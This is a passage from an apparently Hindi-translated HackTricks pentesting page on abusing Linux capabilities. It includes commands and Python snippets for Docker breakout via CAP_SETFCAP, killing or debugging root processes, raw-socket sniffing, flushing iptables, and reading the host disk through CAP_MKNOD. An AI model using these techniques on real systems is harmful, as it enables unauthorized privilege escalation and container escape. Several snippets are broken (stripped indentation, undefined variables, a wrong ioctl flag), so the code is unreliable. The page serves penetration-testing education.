python setcapability.py /usr/bin/python2.7
```
{% hint style="warning" %}
ध्यान दें कि यदि आप बाइनरी को CAP\_SETFCAP के साथ नई क्षमता देते हैं, तो आप इस कैप को खो देंगे।
{% endhint %}

एक बार जब आपके पास [SETUID क्षमता](linux-capabilities.md#cap\_setuid) होती है, तो आप उसके अनुभाग में जा सकते हैं ताकि देख सकें कि विशेषाधिकार कैसे बढ़ाएं।

**उदाहरण पर्यावरण के साथ (Docker ब्रेकआउट)**

डिफ़ॉल्ट रूप से क्षमता **CAP\_SETFCAP कंटेनर के अंदर प्रोसेस को Docker में दी जाती है**। आप इसे कुछ इस तरह से जांच सकते हैं:
```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
यह क्षमता **अन्य किसी भी क्षमता को बाइनरीज़ को देने की अनुमति देती है**, इसलिए हम इस पृष्ठ पर उल्लिखित **अन्य क्षमता ब्रेकआउट्स का दुरुपयोग करके कंटेनर से बचने** के बारे में सोच सकते हैं।\
हालांकि, यदि आप कोशिश करते हैं कि उदाहरण के लिए gdb बाइनरी को CAP\_SYS\_ADMIN और CAP\_SYS\_PTRACE क्षमताएँ दें, तो आप पाएंगे कि आप उन्हें दे सकते हैं, लेकिन **बाइनरी इसके बाद निष्पादित नहीं हो पाएगी**:
```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```
जांच के बाद मैंने यह पढ़ा: _Permitted: यह एक **सीमित सुपरसेट है जो प्रभावी क्षमताओं के लिए है** जिसे थ्रेड मान सकता है। यह उन क्षमताओं के लिए भी एक सीमित सुपरसेट है जो इनहेरिटेबल सेट में एक थ्रेड द्वारा जोड़ी जा सकती हैं, बशर्ते कि उसके प्रभावी सेट में **CAP\_SETPCAP** क्षमता न हो।_

ऐसा लगता है कि Permitted क्षमताएं उन क्षमताओं को सीमित करती हैं जिनका उपयोग किया जा सकता है।
हालांकि, Docker भी डिफ़ॉल्ट रूप से **CAP\_SETPCAP** प्रदान करता है, इसलिए आप **inheritables में नई क्षमताएं सेट कर पाएंगे**।
लेकिन, इस क्षमता के दस्तावेज़ीकरण में: _CAP\_SETPCAP : \[…] **कॉलिंग थ्रेड के बाउंडिंग सेट से कोई भी क्षमता उसके इनहेरिटेबल सेट में जोड़ें**।_
ऐसा लगता है कि हम केवल बाउंडिंग सेट से इनहेरिटेबल सेट में क्षमताएं जोड़ सकते हैं। इसका मतलब है कि **हम विशेषाधिकार वृद्धि के लिए इनहेरिट सेट में CAP\_SYS\_ADMIN या CAP\_SYS\_PTRACE जैसी नई क्षमताएं नहीं डाल सकते**।

## CAP\_SYS\_RAWIO

[**CAP\_SYS\_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) `/dev/mem`, `/dev/kmem` या `/proc/kcore` तक पहुंच, `mmap_min_addr` संशोधित करना, `ioperm(2)` और `iopl(2)` सिस्टम कॉल्स तक पहुंच, और विभिन्न डिस्क कमांड्स सहित कई संवेदनशील ऑपरेशन प्रदान करता है। `FIBMAP ioctl(2)` भी इस क्षमता के माध्यम से सक्षम है, जिसने [अतीत](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html) में समस्याएं पैदा की हैं। मैन पेज के अनुसार, यह धारक को वर्णनात्मक रूप से `अन्य उपकरणों पर डिवाइस-विशिष्ट ऑपरेशन की एक श्रृंखला करने की अनुमति देता है`।

यह **विशेषाधिकार वृद्धि** और **Docker ब्रेकआउट** के लिए उपयोगी हो सकता है।

## CAP\_KILL

**इसका मतलब है कि किसी भी प्रक्रिया को मारना संभव है।**

**बाइनरी के साथ उदाहरण**

मान लीजिए **`python`** बाइनरी में यह क्षमता है। यदि आप **किसी सेवा या सॉकेट कॉन्फ़िगरेशन** (या किसी सेवा से संबंधित कोई कॉन्फ़िगरेशन फ़ाइल) फ़ाइल को भी संशोधित कर सकते हैं, तो आप इसे बैकडोर कर सकते हैं, और फिर उस सेवा से संबंधित प्रक्रिया को मार सकते हैं और नई कॉन्फ़िगरेशन फ़ाइल के आपके बैकडोर के साथ निष्पादित होने का इंतजार कर सकते हैं।
```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```
**kill के साथ Privesc**

यदि आपके पास kill क्षमताएं हैं और कोई **node प्रोग्राम root के रूप में चल रहा है** (या एक अलग उपयोगकर्ता के रूप में), आप शायद उसे **सिग्नल SIGUSR1 भेज** सकते हैं और इसे **node debugger खोलने के लिए मजबूर** कर सकते हैं जिससे आप जुड़ सकते हैं।
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{% content-ref url="electron-cef-chromium-debugger-abuse.md" %}
[electron-cef-chromium-debugger-abuse.md](electron-cef-chromium-debugger-abuse.md)
{% endcontent-ref %}

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) **स्पेन** में साइबर सुरक्षा की सबसे महत्वपूर्ण घटना है और **यूरोप** में भी एक प्रमुख है। तकनीकी ज्ञान को बढ़ावा देने के मिशन के साथ, यह कांग्रेस हर अनुशासन में प्रौद्योगिकी और साइबर सुरक्षा पेशेवरों के लिए एक महत्वपूर्ण मिलन बिंदु है।

{% embed url="https://www.rootedcon.com/" %}

## CAP\_NET\_BIND\_SERVICE

**इसका मतलब है कि किसी भी पोर्ट पर सुनना संभव है (यहां तक कि विशेषाधिकार प्राप्त पोर्ट्स पर भी)।** आप इस क्षमता के साथ सीधे विशेषाधिकार नहीं बढ़ा सकते।

**बाइनरी के साथ उदाहरण**

यदि **`python`** के पास यह क्षमता है, तो वह किसी भी पोर्ट पर सुन सकता है और उससे किसी अन्य पोर्ट पर भी जुड़ सकता है (कुछ सेवाएं विशिष्ट विशेषाधिकार पोर्ट्स से कनेक्शन की मांग करती हैं)

{% tabs %}
{% tab title="सुनना" %}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
output = connection.recv(1024).strip();
print(output)
```
{% endtab %}

{% tab title="संपर्क" %}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
{% endtab %}
{% endtabs %}

## CAP\_NET\_RAW

[**CAP\_NET\_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) एक प्रक्रिया को उपलब्ध नेटवर्क नेमस्पेस के लिए **RAW और PACKET सॉकेट प्रकार बनाने की अनुमति देता है**। यह उजागर नेटवर्क इंटरफेस के माध्यम से मनमाने पैकेट जनरेशन और ट्रांसमिशन की अनुमति देता है। अक्सर यह इंटरफेस एक वर्चुअल ईथरनेट डिवाइस होगा जो एक **दुर्भावनापूर्ण या **समझौता किए गए कंटेनर** को विभिन्न नेटवर्क परतों पर **पैकेट्स** की **स्पूफिंग** करने की अनुमति दे सकता है। इस क्षमता वाली एक दुर्भावनापूर्ण प्रक्रिया या समझौता किए गए कंटेनर अपस्ट्रीम ब्रिज में इंजेक्ट कर सकती है, कंटेनरों के बीच रूटिंग का शोषण कर सकती है, नेटवर्क एक्सेस नियंत्रणों को बायपास कर सकती है, और अन्यथा होस्ट नेटवर्किंग के साथ छेड़छाड़ कर सकती है यदि फ़ायरवॉल स्थान नहीं है जो पैकेट प्रकारों और सामग्रियों को सीमित करता है। अंत में, यह क्षमता प्रक्रिया को उपलब्ध नेमस्पेस के भीतर किसी भी पते से बांधने की अनुमति देती है। यह क्षमता अक्सर विशेषाधिकार प्राप्त कंटेनरों द्वारा बनाए रखी जाती है ताकि पिंग को कार्य करने की अनुमति दी जा सके, जो कंटेनर से ICMP अनुरोध बनाने के लिए RAW सॉकेट्स का उपयोग करता है।

**इसका मतलब है कि ट्रैफिक को स्निफ करना संभव है।** आप इस क्षमता के साथ सीधे विशेषाधिकार नहीं बढ़ा सकते।

**बाइनरी के साथ उदाहरण**

यदि बाइनरी **`tcpdump`** के पास यह क्षमता है, तो आप इसका उपयोग नेटवर्क जानकारी कैप्चर करने के लिए कर सकते हैं।
```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```
ध्यान दें कि यदि **पर्यावरण** यह क्षमता प्रदान कर रहा है, तो आप **`tcpdump`** का उपयोग करके ट्रैफिक की जासूसी भी कर सकते हैं।

**बाइनरी 2 के साथ उदाहरण**

निम्नलिखित उदाहरण **`python2`** कोड है जो "**lo**" (**localhost**) इंटरफेस के ट्रैफिक को इंटरसेप्ट करने के लिए उपयोगी हो सकता है। यह कोड लैब "_The Basics: CAP-NET\_BIND + NET\_RAW_" से है जो [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com) पर उपलब्ध है।
```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
flag=""
for i in xrange(8,-1,-1):
if( flag_value & 1 <<i ):
flag= flag + flags[8-i] + ","
return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
frame=s.recv(4096)
ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
proto=ip_header[6]
ip_header_size = (ip_header[0] & 0b1111) * 4
if(proto==6):
protocol="TCP"
tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
dst_port=tcp_header[0]
src_port=tcp_header[1]
flag=" FLAGS: "+getFlag(tcp_header[4])

elif(proto==17):
protocol="UDP"
udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
dst_port=udp_header[0]
src_port=udp_header[1]

if (proto == 17 or proto == 6):
print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
count=count+1
```
## CAP\_NET\_ADMIN + CAP\_NET\_RAW

[**CAP\_NET\_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) यह क्षमता धारक को **नेटवर्क नेमस्पेस के फ़ायरवॉल, रूटिंग टेबल्स, सॉकेट अनुमतियों को संशोधित करने**, नेटवर्क इंटरफ़ेस कॉन्फ़िगरेशन और अन्य संबंधित सेटिंग्स को नेटवर्क इंटरफ़ेस पर लागू करने की अनुमति देता है। यह जुड़े नेटवर्क इंटरफ़ेस के लिए **प्रोमिस्क्यूअस मोड को सक्षम करने** और संभावित रूप से नेमस्पेस के पार स्निफ करने की क्षमता भी प्रदान करता है।

**उदाहरण के साथ बाइनरी**

मान लीजिए कि **python बाइनरी** में ये क्षमताएँ हैं।
```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```
## CAP\_LINUX\_IMMUTABLE

**इसका मतलब है कि inode गुणों को संशोधित करना संभव है।** आप इस क्षमता के साथ सीधे विशेषाधिकार नहीं बढ़ा सकते।

**बाइनरी के साथ उदाहरण**

यदि आप पाते हैं कि एक फाइल अचल है और python के पास यह क्षमता है, तो आप **अचल गुण को हटा सकते हैं और फाइल को संशोधनीय बना सकते हैं:**
```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
#Pyhton code to allow modifications to the file
import fcntl
import os
import struct

FS_APPEND_FL = 0x00000020
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
f = struct.pack('i', FS_APPEND_FL)
fcntl.ioctl(fd, FS_IOC_SETFLAGS, f)

f=open("/path/to/file.sh",'a+')
f.write('New content for the file\n')
```
{% hint style="info" %}
ध्यान दें कि आमतौर पर यह अचल गुण इस प्रकार सेट और हटाया जाता है:
```bash
sudo chattr +i file.txt
sudo chattr -i file.txt
```
{% endhint %}

## CAP\_SYS\_CHROOT

[**CAP\_SYS\_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) का उपयोग `chroot(2)` सिस्टम कॉल के लिए अनुमति देता है। यह किसी भी `chroot(2)` वातावरण से बचने की अनुमति दे सकता है, ज्ञात कमजोरियों और बचावों का उपयोग करके:

* [विभिन्न chroot समाधानों से कैसे बाहर निकलें](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf)
* [chw00t: chroot बचाव उपकरण](https://github.com/earthquake/chw00t/)

## CAP\_SYS\_BOOT

[**CAP\_SYS\_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) `reboot(2)` सिस्टम कॉल का उपयोग करने की अनुमति देता है। यह `LINUX_REBOOT_CMD_RESTART2` के माध्यम से एक मनमानी **reboot command** निष्पादित करने की भी अनुमति देता है, जो कुछ विशिष्ट हार्डवेयर प्लेटफॉर्मों के लिए लागू किया गया है।

यह क्षमता `kexec_load(2)` सिस्टम कॉल का उपयोग करने की भी अनुमति देती है, जो एक नए क्रैश कर्नेल को लोड करता है और Linux 3.17 के रूप में, `kexec_file_load(2)` जो साइन किए गए कर्नेल को भी लोड करेगा।

## CAP\_SYSLOG

[CAP\_SYSLOG](https://man7.org/linux/man-pages/man7/capabilities.7.html) अंततः Linux 2.6.37 में `CAP_SYS_ADMIN` से अलग किया गया, यह क्षमता प्रक्रिया को `syslog(2)` सिस्टम कॉल का उपयोग करने की अनुमति देती है। यह प्रक्रिया को `/proc` और अन्य इंटरफेसों के माध्यम से उजागर किए गए कर्नेल पतों को देखने की भी अनुमति देता है जब `/proc/sys/kernel/kptr_restrict` को 1 पर सेट किया गया है।

`kptr_restrict` sysctl सेटिंग को 2.6.38 में पेश किया गया था, और यह निर्धारित करता है कि कर्नेल पते उजागर होते हैं या नहीं। यह डिफ़ॉल्ट रूप से शून्य (कर्नेल पतों को उजागर करना) पर सेट होता है, जो कि 2.6.39 के भीतर वेनिला कर्नेल में है, हालांकि कई वितरण सही ढंग से मान को 1 (सभी से छिपाना सिवाय uid 0 के) या 2 (हमेशा छिपाना) पर सेट करते हैं।

इसके अलावा, यह क्षमता प्रक्रिया को `dmesg` आउटपुट देखने की भी अनुमति देती है, यदि `dmesg_restrict` सेटिंग 1 है। अंत में, `CAP_SYS_ADMIN` क्षमता अभी भी ऐतिहासिक कारणों से `syslog` संचालन करने की अनुमति देती है।

## CAP\_MKNOD

[CAP\_MKNOD](https://man7.org/linux/man-pages/man7/capabilities.7.html) [mknod](https://man7.org/linux/man-pages/man2/mknod.2.html) का विस्तारित उपयोग करने की अनुमति देता है, जिससे नियमित फ़ाइल (`S_IFREG`), FIFO (नामित पाइप)(`S_IFIFO`), या UNIX डोमेन सॉकेट (`S_IFSOCK`) के अलावा कुछ और बनाने की अनुमति मिलती है। विशेष फ़ाइलें हैं:

* `S_IFCHR` (कैरेक्टर स्पेशल फ़ाइल (एक डिवाइस जैसे टर्मिनल))
* `S_IFBLK` (ब्लॉक स्पेशल फ़ाइल (एक डिवाइस जैसे डिस्क))।

यह एक डिफ़ॉल्ट क्षमता है ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19))।

यह क्षमता होस्ट पर विशेषाधिकार वृद्धि (पूर्ण डिस्क पढ़ने के माध्यम से) करने की अनुमति देती है, इन शर्तों के तहत:

1. होस्ट पर प्रारंभिक पहुंच होना (अनाधिकृत)।
2. कंटेनर पर प्रारंभिक पहुंच होना (विशेषाधिकार प्राप्त (EUID 0), और प्रभावी `CAP_MKNOD`)।
3. होस्ट और कंटेनर को एक ही यूजर नेमस्पेस साझा करना चाहिए।

**चरण :**

1. होस्ट पर, एक सामान्य उपयोगकर्ता के रूप में:
   1. वर्तमान UID प्राप्त करें (`id`)। उदाहरण के लिए: `uid=1000(unprivileged)`।
   2. डिवाइस प्राप्त करें जिसे आप पढ़ना चाहते हैं। उदाहरण के लिए: `/dev/sda`
2. कंटेनर पर, `root` के रूप में:
```bash
# Create a new block special file matching the host device
mknod /dev/sda b
# Configure the permissions
chmod ug+w /dev/sda
# Create the same standard user than the one on host
useradd -u 1000 unprivileged
# Login with that user
su unprivileged
```
1. होस्ट पर वापस:
```bash
# Find the PID linked to the container owns by the user "unprivileged"
# Example only (Depends on the shell program, etc.). Here: PID=18802.
$ ps aux | grep -i /bin/sh | grep -i unprivileged
unprivileged        18802  0.0  0.0   1712     4 pts/0    S+   15:27   0:00 /bin/sh
```

```bash
# Because of user namespace sharing, the unprivileged user have access to the container filesystem, and so the created block special file pointing on /dev/sda
head /proc/18802/root/dev/sda
```
हमलावर अब अनाधिकृत उपयोगकर्ता से डिवाइस /dev/sda को पढ़, डंप, कॉपी कर सकता है।

### CAP\_SETPCAP

**`CAP_SETPCAP`** एक Linux क्षमता है जो एक प्रक्रिया को **दूसरी प्रक्रिया के क्षमता सेट्स को संशोधित करने की अनुमति देती है**। यह अन्य प्रक्रियाओं के प्रभावी, विरासती, और अनुमत क्षमता सेट्स में क्षमताओं को जोड़ने या हटाने की क्षमता प्रदान करता है। हालांकि, इस क्षमता का उपयोग कैसे किया जा सकता है इस पर कुछ प्रतिबंध हैं।

`CAP_SETPCAP` वाली प्रक्रिया **केवल उन क्षमताओं को प्रदान या हटा सकती है जो उसके अपने अनुमत क्षमता सेट में हैं**। दूसरे शब्दों में, एक प्रक्रिया दूसरी प्रक्रिया को वह क्षमता प्रदान नहीं कर सकती अगर उसके पास वह क्षमता स्वयं नहीं है। यह प्रतिबंध एक प्रक्रिया को दूसरी प्रक्रिया के विशेषाधिकारों को अपने स्वयं के विशेषाधिकार स्तर से अधिक बढ़ाने से रोकता है।

इसके अलावा, हाल के कर्नेल संस्करणों में, `CAP_SETPCAP` क्षमता को **और अधिक प्रतिबंधित** किया गया है। यह अब एक प्रक्रिया को अन्य प्रक्रियाओं के क्षमता सेट्स को मनमाने ढंग से संशोधित करने की अनुमति नहीं देता है। इसके बजाय, यह **केवल एक प्रक्रिया को अपने अनुमत क्षमता सेट या उसके वंशजों के अनुमत क्षमता सेट में क्षमताओं को कम करने की अनुमति देता है**। यह परिवर्तन क्षमता से जुड़े संभावित सुरक्षा जोखिमों को कम करने के लिए पेश किया गया था।

`CAP_SETPCAP` का प्रभावी ढंग से उपयोग करने के लिए, आपके पास अपने प्रभावी क्षमता सेट में यह क्षमता होनी चाहिए और लक्ष्य क्षमताएं आपके अनुमत क्षमता सेट में होनी चाहिए। आप तब `capset()` सिस्टम कॉल का उपयोग करके अन्य प्रक्रियाओं के क्षमता सेट्स को संशोधित कर सकते हैं।

सारांश में, `CAP_SETPCAP` एक प्रक्रिया को अन्य प्रक्रियाओं के क्षमता सेट्स को संशोधित करने की अनुमति देता है, लेकिन यह उन क्षमताओं को प्रदान नहीं कर सकता जो उसके पास स्वयं नहीं हैं। इसके अतिरिक्त, सुरक्षा चिंताओं के कारण, हाल के कर्नेल संस्करणों में इसकी कार्यक्षमता को केवल अपने अनुमत क्षमता सेट या उसके वंशजों के अनुमत क्षमता सेट्स में क्षमताओं को कम करने तक सीमित कर दिया गया है।

## संदर्भ

**इनमें से अधिकांश उदाहरण [**https://attackdefense.pentesteracademy.com/**](https://attackdefense.pentesteracademy.com) के कुछ लैब्स से लिए गए हैं, इसलिए अगर आप इस privesc तकनीकों का अभ्यास करना चाहते हैं तो मैं इन लैब्स की सिफारिश करता हूं।**

**अन्य संदर्भ**:

* [https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
* [https://www.schutzwerk.com/en/43/posts/linux\_container\_capabilities/](https://www.schutzwerk.com/en/43/posts/linux\_container\_capabilities/)
* [https://linux-audit.com/linux-capabilities-101/](https://linux-audit.com/linux-capabilities-101/)
* [https://www.linuxjournal.com/article/5737](https://www.linuxjournal.com/article/5737)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap\_sys\_module](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap\_sys\_module)
* [https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot](https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot)

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) **स्पेन** में सबसे प्रासंगिक साइबर सुरक्षा घटना है और **यूरोप** में सबसे महत्वपूर्ण में से एक है। **तकनीकी ज्ञान को बढ़ावा देने के मिशन के साथ**, यह कांग्रेस प्रौद्योगिकी और साइबर सुरक्षा पेशेवरों के लिए हर अनुशासन में एक उबलता मिलन बिंदु है।

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* अगर आप अपनी **कंपनी को HackTricks में विज्ञापित** देखना चाहते हैं या **HackTricks को PDF में डाउनलोड** करना चाहते हैं तो [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा संग्रह विशेष [**NFTs**](https://opensea.io/collection/the-peass-family)
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में शामिल हों या मुझे **Twitter** पर 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) पर **फॉलो करें**।
* **HackTricks** और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें।

</details>
